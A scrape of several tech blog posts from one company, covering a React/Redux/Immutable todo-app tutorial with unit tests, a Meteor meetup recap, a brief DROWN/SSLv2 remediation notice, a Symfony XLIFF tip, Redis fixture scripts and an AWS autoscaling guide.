Simulate, that simulates user actions (a click, a key press, text inputs…)

The TestUtils addon is not included in the react package, so we have to install it separately:
npm install --save-dev react-addons-test-utils@0.14.7

Our first test will ensure that the TodoList components displays all the active items in the list it has been given if the filter props has been set to active:
test/components/TodoList_spec.jsx
import React from 'react';
import TestUtils from 'react-addons-test-utils';
import TodoList from '../../src/components/TodoList';
import {expect} from 'chai';
import {List, Map} from 'immutable';

const {renderIntoDocument,
       scryRenderedDOMComponentsWithTag} = TestUtils;

describe('TodoList', () => {
  it('renders a list with only the active items if the filter is active', () => {
    const todos = List.of(
      Map({id: 1, text: 'React', status: 'active'}),
      Map({id: 2, text: 'Redux', status: 'active'}),
      Map({id: 3, text: 'Immutable', status: 'completed'})
    );
    const filter = 'active';
    const component = renderIntoDocument(
      <TodoList filter={filter} todos={todos} />
    );
    const items = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(items.length).to.equal(2);
    expect(items[0].textContent).to.contain('React');
    expect(items[1].textContent).to.contain('Redux');
  });
});

We can see that our test is failing: instead of the two active items we want to have displayed, there are three. That is perfectly normal, as we haven’t yet wrote the logic to actually filter the items:
src/components/TodoList.jsx
// ...
export default class TodoList extends React.Component {
  // Filters the items according to their status
  getItems() {
    if (this.props.todos) {
      return this.props.todos.filter(
        (item) => item.get('status') === this.props.filter
      );
    }
    return [];
  }
  render() {
    return <section className=""main"">
      <ul className=""todo-list"">
        // Only the filtered items are displayed
        {this.getItems().map(item =>
          <TodoItem key={item.get('text')}
                    text={item.get('text')} />
        )}
      </ul>
    </section>
  }
};

Our first test passes! Let’s not stop there and add the tests for the filters all and completed:
test/components/TodoList_spec.js
// ...
describe('TodoList', () => {
  // ...
  it('renders a list with only completed items if the filter is completed', () => {
    const todos = List.of(
      Map({id: 1, text: 'React', status: 'active'}),
      Map({id: 2, text: 'Redux', status: 'active'}),
      Map({id: 3, text: 'Immutable', status: 'completed'})
    );
    const filter = 'completed';
    const component = renderIntoDocument(
      <TodoList filter={filter} todos={todos} />
    );
    const items = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(items.length).to.equal(1);
    expect(items[0].textContent).to.contain('Immutable');
  });

  it('renders a list with all the items', () => {
    const todos = List.of(
      Map({id: 1, text: 'React', status: 'active'}),
      Map({id: 2, text: 'Redux', status: 'active'}),
      Map({id: 3, text: 'Immutable', status: 'completed'})
    );
    const filter = 'all';
    const component = renderIntoDocument(
      <TodoList filter={filter} todos={todos} />
    );
    const items = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(items.length).to.equal(3);
    expect(items[0].textContent).to.contain('React');
    expect(items[1].textContent).to.contain('Redux');
    expect(items[2].textContent).to.contain('Immutable');
  });
});

The third test is failing, as the logic for the all filter is sligthly different – let’s update the component logic:
src/components/TodoList.jsx
// ...
export default React.Component {
  // Filters the items according to their status
  getItems() {
    if (this.props.todos) {
      return this.props.todos.filter(
        (item) => this.props.filter === 'all' || item.get('status') === this.props.filter
      );
    }
    return [];
  }
  // ...
});

At this time, we know that the items that are displayed on the app are filtered by the filter property. Indeed, if we look at the app in the browser, we see that no items are displayed as we haven’t yet set it:
src/index.jsx
// ...
const todos = List.of(
  Map({id: 1, text: 'React', status: 'active', editing: false}),
  Map({id: 2, text: 'Redux', status: 'active', editing: false}),
  Map({id: 3, text: 'Immutable', status: 'completed', editing: false})
);

const filter = 'all';

require('../node_modules/todomvc-app-css/index.css')

ReactDOM.render(
  <TodoApp todos={todos} filter = {filter}/>,
  document.getElementById('app')
);

src/components/TodoApp.jsx
// ...
export default class TodoApp extends React.Component {
  render() {
    return <div>
      <section className=""todoapp"">
        // We pass the filter props down to the TodoList component
        <TodoList todos={this.props.todos} filter={this.props.filter}/>
      </section>
    </div>
  }
};

Our items have now reappeared, and are filtered with the filter constant we have declared in the index.jsx file.
The TodoItem component
Note: here is the relevant commit in the companion repository.
Now, let’s take care of the TodoItem component. First of all, we want to make sure that the TodoItem component indeed renders an item. We also want to test the as yet unimplemented feature that when an item is completed, it is stricken-through:
test/components/TodoItem_spec.js
import React from 'react';
import TestUtils from 'react-addons-test-utils';
import TodoItem from '../../src/components/TodoItem';
import {expect} from 'chai';

const {renderIntoDocument,
       scryRenderedDOMComponentsWithTag} = TestUtils;

describe('TodoItem', () => {
  it('renders an item', () => {
    const text = 'React';
    const component = renderIntoDocument(
      <TodoItem text={text} />
    );
    const todo = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(todo.length).to.equal(1);
    expect(todo[0].textContent).to.contain('React');
  });

  it('strikes through the item if it is completed', () => {
    const text = 'React';
    const component = renderIntoDocument(
      <TodoItem text={text} isCompleted={true}/>
    );
    const todo = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(todo[0].classList.contains('completed')).to.equal(true);
  });
});

To make the second test pass, we should apply the class completed to the item if the status, which will be passed down as props, is set to completed. We will use the classnames package to manipulate our DOM classes when they get a little complicated:
npm install --save classnames

src/components/TodoItem.jsx
import React from 'react';
// We need to import the classNames object
import classNames from 'classnames';

import TextInput from './TextInput';

export default class TodoItem extends React.Component {
  render() {
    var itemClass = classNames({
      'todo': true,
      'completed': this.props.isCompleted
    });
    return <li className={itemClass}>
      // ...
    </li>
  }
};

An item should also have a particular look when it is being edited, a fact that is encapsulated by the isEditing prop:
test/components/TodoItem_spec.js
// ...
describe('TodoItem', () => {
  //...

  it('should look different when editing', () => {
    const text = 'React';
    const component = renderIntoDocument(
      <TodoItem text={text} isEditing={true}/>
    );
    const todo = scryRenderedDOMComponentsWithTag(component, 'li');

    expect(todo[0].classList.contains('editing')).to.equal(true);
  });
});

In order to make the test pass, we only need to update the itemClass object:
src/components/TodoItem.jsx
// ...
export default class TodoItem extends React.Component {
  render() {
    var itemClass = classNames({
      'todo': true,
      'completed': this.props.isCompleted,
      'editing': this.props.isEditing
    });
    return <li className={itemClass}>
      // ...
    </li>
  }
};

The checkbox at the left of the item should be ckecked if the item is completed:
test/components/TodoItem_spec.js
// ...
describe('TodoItem', () => {
  //...

  it('should be checked if the item is completed', () => {
    const text = 'React';
    const text2 = 'Redux';
    const component = renderIntoDocument(
      <TodoItem text={text} isCompleted={true}/>,
      <TodoItem text={text2} isCompleted={false}/>
    );
    const input = scryRenderedDOMComponentsWithTag(component, 'input');
    expect(input[0].checked).to.equal(true);
    expect(input[1].checked).to.equal(false);
  });
});

React has a method to set the state of a checkbox input: defaultChecked.
src/components/TodoItem.jsx
// ...
export default class TodoItem extends React.Component {
  render() {
    // ...
    return <li className={itemClass}>
      <div className=""view"">
        <input type=""checkbox""
               className=""toggle""
               defaultChecked={this.props.isCompleted}/>
        // ...
      </div>
    </li>
  }
};

We also have to pass down the isCompleted and isEditing props down from the TodoList component:
src/components/TodoList.jsx
// ...
export default class TodoList extends React.Component {
  // ...
  // This function checks whether an item is completed
  isCompleted(item) {
    return item.get('status') === 'completed';
  }
  render() {
    return <section className=""main"">
      <ul className=""todo-list"">
        {this.getItems().map(item =>
          <TodoItem key={item.get('text')}
                    text={item.get('text')}
                    // We pass down the info on completion and editing
                    isCompleted={this.isCompleted(item)}
                    isEditing={item.get('editing')} />
        )}
      </ul>
    </section>
  }
};

For now, we are able to reflect the state of our app in the components: for
example, a completed item will be stricken. However, a webapp also handles user
actions, such as clicking on a button. In the Redux model, this is also
processed using props, and more specifically by passing callbacks as props.
By doing so, we separate once again the UI from the logic of the app: the
component need not knowing what particular action will derive from a click –
only that the click will trigger something.
To illustrate this principle, we are going to test that if the user clicks on
the delete button (the red cross), the deleteItem function is called:
Note: here is the relevant commit in the companion repository.
test/components/TodoItem_spec.jsx
// ...
// The Simulate helper allows us to simulate a user clicking
const {renderIntoDocument,
       scryRenderedDOMComponentsWithTag,
       Simulate} = TestUtils;

describe('TodoItem', () => {
  // ...
  it('invokes callback when the delete button is clicked', () => {
    const text = 'React';
    var deleted = false;
    // We define a mock deleteItem function
    const deleteItem = () => deleted = true;
    const component = renderIntoDocument(
      <TodoItem text={text} deleteItem={deleteItem}/>
    );
    const buttons = scryRenderedDOMComponentsWithTag(component, 'button');
    Simulate.click(buttons[0]);

    // We verify that the deleteItem function has been called
    expect(deleted).to.equal(true);
  });
});

To make this test pass, we must declare an onClick handler on the delete
button that will call the deleteItem function passed in the props:
src/components/TodoItem.jsx
// ...
export default class TodoItem extends React.Component {
  render() {
    // ...
    return <li className={itemClass}>
      <div className=""view"">
        // ...
        // The onClick handler will call the deleteItem function given in the props
        <button className=""destroy""
                onClick={() => this.props.deleteItem(this.props.id)}></button>
      </div>
      <TextInput />
    </li>
  }
};

It is important to note that the actual logic for deleting the item has not been
implemented yet: that will be the role of Redux.
On the same model, we can test and imlement the following features:

A click on the checkbox should call the toggleComplete callback
A double click on the item label should call the editItem callback

test/components/TodoItem_spec.js
// ...
describe('TodoItem', () => {
  // ...
  it('invokes callback when checkbox is clicked', () => {
    const text = 'React';
    var isChecked = false;
    const toggleComplete = () => isChecked = true;
    const component = renderIntoDocument(
      <TodoItem text={text} toggleComplete={toggleComplete}/>
    );
    const checkboxes = scryRenderedDOMComponentsWithTag(component, 'input');
    Simulate.click(checkboxes[0]);

    expect(isChecked).to.equal(true);
  });

  it('calls a callback when text is double clicked', () => {
    var text = 'React';
    const editItem = () => text = 'Redux';
    const component = renderIntoDocument(
      <TodoItem text={text} editItem={editItem}/>
    );
    const label = component.refs.text
    Simulate.doubleClick(label);

    expect(text).to.equal('Redux');
  });
});

src/components/TodoItem.jsx
// ...
render() {
  // ...
  return <li className={itemClass}>
    <div className=""view"">
      // We add an onClick handler on the checkbox
      <input type=""checkbox""
             className=""toggle""
             defaultChecked={this.props.isCompleted}
             onClick={() => this.props.toggleComplete(this.props.id)}/>
      // We add a ref attribute to the label to facilitate the testing
      // The onDoubleClick handler is unsurprisingly called on double clicks
      <label htmlFor=""todo""
             ref=""text""
             onDoubleClick={() => this.props.editItem(this.props.id)}>
        {this.props.text}
      </label>
      <button className=""destroy""
              onClick={() => this.props.deleteItem(this.props.id)}></button>
    </div>
    <TextInput />
  </li>

We also have to pass down the editItem, deleteItem and toggleComplete functions as props down from the TodoList component:
src/components/TodoList.jsx
// ...
export default class TodoList extends React.Component {
  // ...
  render() {
      return <section className=""main"">
        <ul className=""todo-list"">
          {this.getItems().map(item =>
            <TodoItem key={item.get('text')}
                      text={item.get('text')}
                      id={item.get('id')}
                      isCompleted={this.isCompleted(item)}
                      isEditing={item.get('editing')}
                      // We pass down the callback functions
                      toggleComplete={this.props.toggleComplete}
                      deleteItem={this.props.deleteItem}
                      editItem={this.props.editItem}/>
          )}
        </ul>
      </section>
    }
};

Setting up the other components
Now that you are a little more familiar with the process, and in order to keep
the length of this article in reasonable constraints I invite you to have a look
at the companion repository for the code responsible for the TextInput (relevant commit), TodoHeader (relevant commit) and TodoTools and Footer (relevant commit) components. If you have any question about those components please leave a comment here, or an issue on the repo!
You may notice that some functions, such as editItem, toggleComplete and the like, have not yet been defined. They will be in the next part of this tutorial as Redux actions, so do not worry yet if your console start throwing some errors about those.
Wrap up
In this article we have paved the way for our very first React, Redux and
Immutable web app. Our UI is modular, fully tested and ready to be wired up with
the actual app logic. How will that work? How can these seemingly dumb
components, that don’t even know what they are supposed to do, empower us to
write an app that can travel back in time?
Part two of the tutorial is available here!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Goutay
  			
  				Webdeveloper at Theodo. Webdesign & UX enthusiast.  			
  		
    
			

									"
"
										A few weeks ago, I went to a Meteor meetup. On this occasion, I had the chance to attend a highly instructive debate about the future of a framework I like. I will try to give you a quick summary of everything I heard.
Of course, without sponsor, there is no event, I would like to thank 42mg’s team, an open source software which aims at helping people with project management. I would also like to thank the PCF to provide us a place for this meetup in its headquarters, a supernatural concrete building erected by Oscar Niemeyer. The inside of the building is particularly inspiring.
Finally, I address a special thanks to Breaz.io, a platform for developers to meet recruiters, for their help.
Why people use MeteorJs?
The main lesson I learned from my MeteorJs experiences is that it is freakingly simple. If you doubt this, I invite you to read another article I wrote a few weeks ago about how to deploy a MeteorJs application in less than 10 minutes.
To quickly summarize this point, I would say that by nature, Meteor is strongly monolithic, it limits the number of technologies you can plug on it. The consequence entailed is Meteor works out of the box. If you need to add a component, go to Atmosphere and if you find your package, add it in one command line and it will work.
This makes Meteor the quickest framework to bring value into your application you started from scratch. One of the attendee told us about his experience: “Using Meteor made me save 2 work-months on my project”
The criticism we hear about Meteor

The thing I heard the most about Meteor is that it is slow and heavy.
One attendee explained that the inner Meteor builder, when operating a large number of files, can become slow and that he even had to use Webpack with meteor to operate on his builds.
The package manager, Atmosphere, is non standard and not npm compliant, so, if you want to add a npm package, rewrite it, or wrap it yourself.
You can’t add easily add every technology on a Meteor, for example, you are almost married to MongoDb
Javascript is a turbulent ecosystem, the current components in a NodeJs environment are easy to reorganise, not Meteor.
There is currently no bright example of large Meteor application used by a strong company mainly because its package ecosystem is too much insular against the overwhelming npm’s one.
We also heard that you can’t plug a technology and play. You can’t use a part of the solution and use another templating solution for example. It lack modularity. That’s the monolithic part.

What is planned for the future and why it is uncertain

React is coming with its packages and community to shake the little Meteor ecosystem.
NPM is coming.
Meteor nested methods are still using callbacks instead of promises, but it may change soon.
As a result, Meteor is initiating a transition phase to get close to npm. This entails the frustration of the trained users that see the features of their beloved framework relocated. These guys are worried to see Meteor loose Blaze and become very far from what it was initially.
According to a guy in the assembly: “The migration to Meteor 2, if that ever sees the light of day, has all chances to be a tough one”.

But it has all chances to be bright
Meteor:

Has money. The company raised more than 11 million dollars at its beginning and still has money left, furthermore, they won’t stop here.
Has an active community
Is moving forward. Contributions, patches, versions, evolutions are happening relentlessly.
Is adapting and evolves quickly
Has a promising 1.3 version
The 1.3 version of Meteor is really willing to change the framework, indeed, it opens to asynchronous comportment, but better, it adds a package import supporting npm that seems stronger than Webpack
Meteor is a full stack boilerplate solution for js web project. With it, you have a backend AND a frontend solution to develop. It was shown as the only viable competitor since SailJS hasn’t enough traction.
Has an outstanding adoption curve
A lot of people want to try Meteor, it shows that this framework generates interest from developers.

Meteor is blessed with a great community, far more active than Sails’ one. It also offer a good usability and a fine kickstart for your project, saving about 2 months with no business value.
Meteor needs guidelines
A nice project, Mantra, showed up, it is aimed at providing guidelines to build a cutting edge scalable application based on Meteor. It allows npm uses and provides a testing environment which is great for Meteor newcomers
Conclusions:
As one might understand, Meteor is on the brink of a revolution. Its identity as a framework is at stake and it may regress to a rather complete kickstart. But, in the current process, we can witness hope from its community, the company who backed it and the technical choices of its maintainers.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thibaut Cheymol
  			
  				Thibaut is a full-stack web developer. Passionate about Javascript, he has a preference for ReactJs  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Cyrille Hugues
  			
  				  			
  		
    
			

									"
"
										
A new security vulnerability has been detected in HTTPS yesterday: DROWN. The attack can decrypt a HTTPS connection. Impact: hackers can steal your users data, such as their password, credit card number and personal information.
Basically, your server is vulnerable if it is able to handle HTTPS connections through SSLv2 or previous versions of the protocol. Likewise, if your server does not support SSLv2 but your certificate’s private key is also used on another server that supports it, the exploit remains possible.
And this is true even if it is used by another protocol (e.g. POP3 protocol for your mail server).
How can I check if my server is vulnerable?
Thanks to the checker provided by the DROWN website, you can check if your server is vulnerable to DROWN.
Nevertheless, it might return an empty result if your domain has never been crawled by the drownattack.com team. Fortunately, there is a python utility available on GitHub. You can scan your server thanks to it and detect if your server is vulnerable. Everything is explained in the documentation.
Oops, I’m vulnerable. How do I fix that?
You must disable SSLv2 on your servers, in every service: webserver, mail server… Use TLS only. It is simple with Apache or Nginx but it might not be as simple for other technologies. Once again, read the counter measure on the DROWN website!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Remy Luciani
  			
  				Theodoer since 2011, Architect/Developer & Coach. DevOps enthusiast. 

""The Prod is life!""  			
  		
    
			

									"
"
										XLIFF?
XLIFF is one of the 3 different formats you can use for translation in Symfony.
It is the recommended format because of its standard use by professional translators.
<trans-unit id=""42"">
    <source>french_food</source>
    <target>Omelette du fromage</target>
</trans-unit>

In Symfony, ids in XLIFF have no particular meaning, all you need is for them to be distinct in the same file.
Everything is about the source, which becomes the key in your translation catalogue once the file is loaded.
Usually, people use numbers as id, as you can see in Symfony documentation.
Problem with numbers
You have harder conflicts to resolve when working with git:
if two contributors used the same ids, one of them has to renumber its translations to be sure ids are unique.
If a contributor decides to rearrange the translations in a file to group them by category:

Either he/she renumbered all the ids and then it’s a nightmare with git.
Or the file is not sorted by id anymore, and you don’t know what the next id you have to use for the next translation is.

Simple solution
Do yourself a favor, use the source as the id!
No more meaningless number, no more headache with numbering.
<trans-unit id=""french_food"">
    <source>french_food</source>
    <target>Omelette du fromage</target>
</trans-unit>

One of the hidden benefits is that Symfony will now yell at you if you have a duplicated source in your file, whereas it was silently overwriting the duplications before.
Neat!
Edit: I updated Symfony documentation following this post since core contributors felt the same way as I do.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Roussel
  			
  				After graduating from l'École Normale Supérieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  			
  		
    
			

									"
"
										Redis is a fantastic tool to handle data in an amazingly simple and rapid manner. If you’re not using it yet, you should read some posts about it. Here’s a way you can manage redis fixtures in your projects.
Redis and microservices
In our current web project we use Redis to handle hot data that can be updated using microservices.

To initialize our development environment, we use scripts that populate Redis from the Postgresql databases of our microservices. Our problem: As we have quite a large set of data, it was taking time to populate Redis. This should not be the case in production, but in a development environment this is quite common. 
The quickest and most simple solution we found is to load a backup of our Redis store. Fortunately for us, Redis automatically creates a backup file (/var/lib/redis/dump.rdb) that is constantly updated. All we have to do to restore a backup is to replace the /var/lib/redis/dump.rdb file with our own. This article provides a great explanation on how it is done. As the file is quite large, we need to compress it. This is where we were met with a significant problem that was not covered in the article: the tar command corrupts the dump.rdb file. We simply solve it by using the bzip2 command instead.
Loading the fixtures in Vagrant and Docker
If you are using Vagrant like us for your development environment, you need to run the following script inside the vm:
cd /var/www/myapp/current
cp data/backupredis.rdb.bz2 data/dump.rdb.bz2
bunzip2 data/dump.rdb.bz2
sudo service redis-server stop
sudo mv data/dump.rdb /var/lib/redis/dump.rdb
sudo chown redis:redis /var/lib/redis/dump.rdb
sudo service redis-server start

Notice that you need to run it as root.If you’re not using it yet, …
– You can build a new image with the correct dump.rdb.
– You can put the dump.rdb in a shared folder and you replace it during the start.sh of your container.
Updating the fixtures
As the project goes on, we need new versions of the fixtures.
To update our backup file with the data from one environment we use the following script:
#!/usr/bin/env bash
rm -f ../data/backupredis.rdb.bz2
scp root@IP_TARGET_ENVIRONMENT:/var/lib/redis/dump.rdb ../data/backupredis.rdb
bzip2 ../data/backupredis.rdb

We then commit and push the file so that developers can quickly get the last version of the fixtures.
For Docker users, if have the build a new image solution, you need to rebuild the image of your container at the end of this step.
Conclusion
Dealing with the backup of a Redis store was quite simple – another of the reasons why Redis is an awesome tool. If you liked this article and don’t want to miss the next one, you can follow me on Twitter.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										What is autoscaling? Do I need it?
A good application should always be able to send responses to users’ requests within reasonable delay. That’s the whole point of application scaling.
Most of the time the scaling process is predictable and happens over a long period of time (weeks, months or even years). In this kind of situation, those in charge of the infrastructure will have an idea of how many servers their app needs in advance. This gives them sufficient time to acquire, provision and deploy the extra instances ahead of time.

However consider the following scenario: we’re about to publish on our website a critical piece of news that’s going to attract a lot of attention. We expect a huge peak of users over a relatively short period of time (a couple of days maybe) and then, in all likelihood, the metrics will slowly go back to their usual level over a longer period (days, weeks or maybe even months). We wouldn’t want to #BreakTheInternet so we need to prepare.
In this scenario the scaling process is hectic and unpredictable. We obviously need more servers to handle the extra load, but how many exactly? Eyeballing the resources needed to handle the peak might be difficult, especially if it’s the first time we’re getting out of our load “comfort zone”.
Even then, assuming we decide to trust our totally-made-up-formula-which-is-definitely-not-just-a-cross-multiplication on the number of instances we’ll need, should we provision and deploy them ourselves? If so, when is the right time to do so? Twenty-four hours in advance to give us time to test our new servers or 20 minutes before prime time to reduce the costs? The same kind of question applies for instances termination.
Autoscaling is the solution to this problem. Quoting Wikipedia:

Autoscaling […] is a method used in cloud computing, whereby the amount of computational resources in a server farm, typically measured in terms of the number of active servers, scales automatically based on the load on the farm.

With autoscaling, no need to try and compute the number of instances required, or devise a plan to be able to deploy new instances manually in case we reach maximum capacity. The autoscaling system automatically starts and stops instances depending on the load it’s facing.
If you want your application to be able to handle a rapidly-changing load then you might want to look into autoscaling. It’s also a good way to minimise your bills if you’re already using a hosting provider that supports it (only using the resources you need and no more).
Amazon Web Services (AWS) offers such an autoscaling system to be used with it’s Elastic Compute Cloud (EC2) instances.
What we need
An AWS account
If you already have an Amazon account you can just login to AWS, if not you can create an account from the same page.
During your first login, AWS will ask for your credit card details, however you’ll be eligible to AWS Free Tier which includes most of AWS services for free during one year (with limitations of course).
Remember to activate Multi-Factor Authentication for more security.
A certificate
Once your AWS account is created, go to Security Credentials > X.509 Certificates and click Create new certificate. This certificate will be used to log in to the instances.
A stateless application
Whether it’s a website or the backend of some software, an application needs to be stateless in order to be able to increase the number of application servers effortlessly.
Setting it up
Amazon’s implementation of autoscaling is based on their infamous EC2 instances. Auto scaling groups are collections of an indefinite number of such instances, but managed as one single entity.
The goal of this section is to create a simple auto scaling group (aka ASG in the rest of this article). To do so we will also need a template to create the instances from.
It all starts with one button: go to Services > EC2 then Autoscaling > Launch Configurations and …

It will take us to the Launch Configuration creation page.
Launch configuration
The launch configuration (LC) is the template mentioned above. It creates the machines running in our auto scaling group. For example when our instances reach a predefined threshold AWS will spin up a new EC2 instance based on this launch configuration.
Creating a launch configuration is exactly like configuring a new EC2 instance, except it won’t actually launch any! We’re asked to choose an AMI and an instance type (nano, micro, medium, etc) and optionally configure storage and security groups. If you already have some experience with EC2 you shouldn’t have any trouble doing this.
Finally after we’ve picked a name for our launch configuration and reviewed it, it’s time to save it.
Auto scaling group
Now that our launch configuration is ready we can move on to creating an auto scaling group.
An auto scaling group is a set of identical EC2 instances: they’re all based on the same launch configuration so they have the same (virtual) hardware specs and the same provisioning. An ASG lives in a VPC (Virtual Private Cloud, a private network basically) and we can assign it several subnets. If you don’t already have one, now is the time to create one for your ASG.
We can optionally create scaling policies to dictate how and when EC2 instances should be created or destroyed. One option is to “Keep this group at its initial size” and not configure any scaling policies. This is self explanatory: nothing will happen to our instances until we update the configuration.
However it starts becoming interesting when we do configure scaling policies. After we’ve chosen the default size of the ASG and reviewed its configuration, let’s save it and create scaling policies!
Scaling policies
Scaling policies give fine control over when and how to create and destroy instances in an ASG.
A policy is usually set off by an alarm (although it’s not always necessary to configure one: we could also trigger policies manually) and takes an action. After its creation a new instance has a warm-up period during which it doesn’t contribute to the ASG metrics.
You could imagine a scaling policy as a sentence:

When the average CPU utilization is greater than 80%, then launch 2 more instances.


The “when” part of this sentence is the alarm ;
the “then” part is the action.

Alarms
Alarm are triggered when certain instance metrics reach a predefined threshold. The figure below shows the metrics available to the alarm.

Actions
There are three types of action:

add instance(s)
remove instance(s)
set the number of instances


Application lifespan
Now that our application has a variable number of instances to live on comes the time to deploy it. We’ll discuss the two critical moments in an application lifespan: provisioning and deployment.
Provisioning an ASG
We’ve mentioned it quickly earlier but the crucial point here is that launch configurations are linked to an AMI (Amazon Machine Image). An AMI describes the filesystem content of a server and thus makes for a very good provisioning system.
Creating a provisioning image
We’ll want to create a provisioning AMI that contains our dependencies (eg. nginx, php, mysql, etc). We’ll then use it with our launch configuration.
Let’s assume for now we have a provisioned instance we wish to use as our base for our future instances. We’ll create a new AMI from this instance:

We’ll be asked to name this image, I suggest using some sort of versioning scheme (eg. MyAwesomeBlog-v1) to avoid accidentally reprovisioning our fleet with the same AMI (or even worse: reprovisioning it with an older image)!
There are a couple of ways to provision an instance to build an AMI from. In both cases we’ll need to create a new EC2 instance (one that’s not part of the ASG) to build it from, using the AMI we want to use as a base (latest Ubuntu LTS for example). From there we could either configure the system and install dependencies manually or use a provisioning tool such as Ansible.
(Re)provisioning
Once we have a new AMI we wish to deploy to our instances we’ll need to tie it to a launch configuration.
However, here comes the tricky part: AWS doesn’t allow us to change the AMI of a launch configuration. The only option left is to copy our existing LC and use the new AMI with the copied LC.

When creating the LC copy, remember to edit the AMI to use the new one!
Once that is done we can edit the ASG to use the new LC. From now on the newly launched instances will have the new provisioning.
What’s left for us to do is to progressively replace the old instances of our ASG with newer ones (based on the new AMI). To do that the easiest is to manually executes scaling policies. There are several strategies here: if there are n instances in the ASG we could either launch n new instances, wait for them to spin up (warm-up time) and then destroy all n old ones or create and delete instances one at a time (doing so n times). This depends mostly on how much time and budget we have (having more instances costs more, obviously).
Deploying to an ASG
Having a variable-sized fleet of servers for our application gives rise to two problems:

A new version of our app has been released, we want to deploy it. How do we know which (and how many) servers we should deploy it to?
A scaling policy has been executed and a new instance has been launched inside our ASG. Should we deploy the app to this new instance ourselves?

CodeDeploy config
Fortunately AWS provides an ASG-compatible deployment tool: CodeDeploy. It takes care of all deployment-related tasks and solves the two aforementioned problems.
When creating an “Application” within CodeDeploy, we’ll need to enter a name for it and choose the ASG we’re using.
CodeDeploy implements different deployment configurations. Quoting AWS website:

OneAtATime (most secure): deploys to one instance at a time. Succeeds if all instances succeed. Fails after the very first failure. Allows the deployment to succeed for some instances, even if the overall deployment fails.
AllAtOnce (least secure): deploys to up to all instances at once. Succeeds if at least one instance succeeds. Fails after all instances fail.
HalfAtATime: deploys to up to half of the instances at a time. Succeeds if at least half of the instances succeed; fails otherwise. Allows the deployment to succeed for some instances, even if the overall deployment fails.

Depending on the expected resilience of our application we can opt for the quickest, least secure option (AllAtOnce) up to the most secure option (OneAtATime) which will probably take a while if we have a large amount of instances.
The final step is to configure a Service Role to grant access to the instances to CodeDeploy. Such a Role can be created in the IAM interface and should be attached to the policy “AmazonEC2FullAccess”.
The deployment configuration is specified by an appspec.yml file that should be placed in the root of our code directory.
GitHub config
In order to deploy we now need to send our code/binaries to CodeDeploy. For this we have two options: upload them to S3 or use GitHub. For the purpose of this article we’ll assume the code is hosted on GitHub (which is a much better option anyway).
Create a new deployment within CodeDeploy and choose “My application is stored in GitHub” as a Revision Type. If that’s not the case already you’ll be asked to connect your GitHub account (oAuth) to AWS. From there we’ll be able to choose which repository and which commit we want to deploy. Click “deploy now” and that’s it!
This is all very manual, so the next step is to have a nice auto-deploy feature. Wouldn’t it be nice if our application was automatically deployed when a new commit on “master” has passed the CI tests? This great post from AWS blog explains it in detail.
Going further
There are a couple points we haven’t mentioned yet:

Step adjustments: scaling policies can either provide simple scaling (this is what we’e been using until now) or step scaling. Step scaling enables us to change the magnitude of the action based on the size of the alarm threshold breach:

  In this example we’re creating a variable amount of new instances based on the CPU level (above the alarm level).
Scheduled actions: actions don’t have to be triggered by an alarm (and thus be part of a scaling policy) to be executed, they can also be scheduled. That’s very useful if we want to, say, lower our application resources every week-end.
ASGs also support spot instances (cheaper, otherwise unused EC2 instances, availability depends on your bid).
Our application will need a load balancer to distribute requests. AWS’s Elastic Load Balancers work out of the box with ASG.

Now that our ASG is setup, everything should be running smoothly. The reliability of our application depends, of course, a lot on our scaling policies. Depending on the requirements we have to meet it might be more interesting to scale out quickly and then scale in slowly (à la Netflix), or the other way round, or another entirely different strategy.
However I cannot stress enough how important having the right scaling policies is. From Netflix’s article:

Auto scaling is a very powerful tool, but it can also be a double-edged sword. Without the proper configuration and testing it can do more harm than good. A number of edge cases may occur when attempting to optimize or make the configuration more complex.

Happy scaling!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nathan Gaberel
  			
  				Architect-developer at Theodo UK  			
  		
    
			

									"
"
										Image credits: egghead.io
This is the second and last part of the React, Redux and Immutable tutorial. In case you missed it, the first part is available here.
In the first part, we laid the UI foundation for our app, developing and unit-testing modular components.
We saw that the state of our app was passed down to individual components as React props, and that user-actions were declared as callbacks, thus separating UI from app logic.
In case you’re onboarding now or you would like to start this second part from exactly where we left earlier, here is a link to the commit from the companion repository I’ll be starting from.
Feel free to clone the repo and follow along!
Introducing the Redux workflow
At this point, our UI is not interactive: although we tested the fact that if an item is set as completed it will be stricken through, there is as yet no way to invite the user to complete it.
In the Redux ecosystem, UI updates and user options always follow the same workflow:

The state tree defines the UI and the action callbacks through props
User actions, such as clicks, are sent to an action creator that normalizes them
The resulting redux actions are passed to a reducer that implements the actual app logic
The reducer updates the state tree and dispatches it to a store that, well, stores it
The UI is updated accordingly to the new state tree in the store


Setting the initial state
Note: here is the relevant commit in the companion repository.
Our first action will allow us to properly set the initial state in the Redux store, that we are about to create.
An action in Redux is a payload of information. As such, it is represented by a JSON object with a type attribute that describes concisely what the action does and other pieces of information devised by the needs of the app. In our case, the type can be set to SET_STATE and we can add a state object that contains the desired state:
{
  type: 'SET_STATE',
  state: {
    todos: [
      {id: 1, text: 'React', status: 'active', editing: false},
      {id: 2, text: 'Redux', status: 'active', editing: false},
